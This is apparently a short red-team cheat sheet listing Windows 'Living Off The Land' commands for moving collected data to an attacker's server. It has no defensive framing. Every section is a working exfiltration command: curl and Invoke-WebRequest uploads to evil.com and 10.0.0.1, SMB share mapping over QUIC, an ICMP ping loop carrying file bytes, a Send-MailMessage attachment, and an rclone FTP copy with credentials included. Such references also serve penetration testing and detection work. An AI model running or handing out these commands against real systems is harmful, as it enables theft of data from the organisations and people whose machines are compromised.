# Exfiltration via System Commands

Living Off The Land techniques are used for transfering collected data to an attacker's server over several protocols.

## Over HTTP/HTTPs

- Curl

    ```powershell
    curl -k -F "file=@./data.txt" https://evil.com/
    ```

- Invoke-WebRequest (iwr)

    ```powershell
    $content = Get-Content .\data.txt
    iwr -uri http://10.0.0.1 -Method POST -Body $content
    ```

## Over SMB

- Net

    ```powershell
    net use * "\\evil.com\shared_folder" / TRANSPORT:QUIC /SKIPCERTCHECK
    copy ".\data.txt" "Z:\data.txt"
    ```

- New-SmbMapping

    ```powershell
    New-SmbMapping -RemotePath "\\evil.com\shared_folder" -TransportType QUIC -SkipCertificateCheck
    copy ".\data.txt" "Z:\data.txt"
    ```

## Over ICMP

- Ping

    ```powershell
    $ping = New-Object System.Net.Networkinformation.ping
    foreach($Data in Get-Content -Path C:\data.txt -Encoding Byte -ReadCount 1024) {$ping.Send("evil.com", 1500, $Data)}
    ```

## Over SMTP

This command sends a mail attached a collected data file to an attacker's server.

```powershell
Send-MailMessage -From sender@evil.com -To recipient@evil.com -Subject "Hello" -Attachments C:\data.txt -SmtpServer 10.0.0.1
```

## Over FTP

This command sends a collected data (`data.zip`) to the FTP server (`ftp.dlptest.com`). `rclone.exe` is not a built-in binary, so it must exist on a target system.

```powershell
rclone config create ftpserver "ftp" "host" "ftp.dlptest.com" "port" "21" "user" "dlpuser" "pass" "password123"
rclone copy --max-age 2y C:\data.zip ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
```